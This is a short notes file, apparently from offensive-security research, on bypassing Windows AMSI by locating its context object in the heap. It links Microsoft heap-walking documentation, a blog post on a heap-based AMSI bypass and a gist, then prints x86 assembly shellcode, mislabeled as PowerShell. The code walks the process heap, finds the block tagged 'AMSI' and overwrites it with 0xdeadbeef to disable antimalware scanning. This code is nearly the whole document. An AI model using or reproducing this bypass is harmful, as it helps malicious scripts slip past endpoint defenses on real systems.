
## search for context object in heap

https://docs.microsoft.com/en-us/windows/win32/memory/enumerating-a-heap

https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapwalk

https://codewhitesec.blogspot.com/2019/07/heap-based-amsi-bypass-in-vba.html

https://gist.github.com/DanShaqFu/5599eecce8c7428779aa7537e4707196
```powershell
killAMSI proc
	push ebp
	mov ebp, esp
	; allocate space for our phe
	sub esp, sizeof PROCESS_HEAP_ENTRY

	push edx
	push esi

	; fetch first heap of process
	lea edx, [ebx].ShellCodeEnvironment.heapHandle
	push edx
	push 1 ; only one heap handle please
	call [ebx].ShellCodeEnvironment.getProcessHeapsAddress

; initialize lpData to zero for the first time
	lea esi,  [ebp -  sizeof PROCESS_HEAP_ENTRY].PROCESS_HEAP_ENTRY
	xor eax, eax
	mov [esi], eax
; now iterate over the heap via HeapWalk

doTheMoonWalk:
	push esi
	push [ebx].ShellCodeEnvironment.heapHandle
	call [ebx].ShellCodeEnvironment.heapWalkAddress
	or eax, eax
	jz noAMSIFound
	; fetch flags from PHE
	mov al, byte ptr [esi].PROCESS_HEAP_ENTRY.wFlags
	; check if this an allocated area
	and al, 14h
	jz doTheMoonWalk
	; allocated block -> check data
	mov edx, dword ptr [esi].PROCESS_HEAP_ENTRY.lpData
	cmp dword ptr [edx], 049534d41h ; "AMSI"
	jnz doTheMoonWalk
	; we found the AMSI context --> destroy it
	int3
	mov eax, 0deadbeefh	
	mov [edx], eax
noAMSIfound:	
	pop esi
	pop edx
	; restore stack pointer
	mov esp, ebp
  	pop ebp
	ret

killAMSI endp
```
